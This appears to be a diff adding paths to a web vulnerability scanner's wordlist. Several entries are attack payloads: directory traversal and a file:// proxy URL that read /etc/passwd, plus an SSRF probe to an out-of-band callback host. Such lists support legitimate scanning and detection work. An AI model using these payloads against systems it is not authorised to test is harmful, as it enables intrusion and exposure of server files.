@@ -1,0 +1,7 @@
+/static/js/../../../../../../../../../../../../../../etc/passwd
+/nodes?view=summary
+/api/v0/logs/file?node_id={{nodeid}}&filename=../../../../../etc%2fpasswd&lines=50000
+/pictureproxy.php?url=file:///etc/passwd
+/pictureproxy.php?url=http://{{interactsh-url}}
+/auth/login
+/icinga2
